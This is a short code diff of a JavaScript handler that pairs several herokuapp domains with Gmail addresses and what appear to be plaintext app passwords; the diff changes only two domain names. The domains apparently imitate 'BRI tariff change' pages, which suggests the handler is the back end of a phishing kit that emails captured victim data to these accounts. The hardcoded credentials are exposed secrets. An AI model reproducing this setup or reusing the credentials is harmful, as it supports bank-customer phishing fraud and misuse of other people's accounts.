@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'tarif-bri-ubah.herokuapp.com'){
+    } else if(url == 'tarifff-bri-ubah.herokuapp.com'){
         email = 'andin1234zx@gmail.com' ;
         pass = 'ujnjjdjcumttwjsu' ;
 
@@ -20,7 +20,7 @@ export default function handler(req, res) {
         email = 'brigacor80@gmail.com';
         pass = 'zhzcfhbdtzipldsz';
         
-    } else if(url == 'tariff-perubah-an.herokuapp.com'){
+    } else if(url == 'tarif-perubah-an.herokuapp.com'){
         email = 'qqq66195@gmail.com';
         pass = 'gsnyrcjtylrepjdg';
 
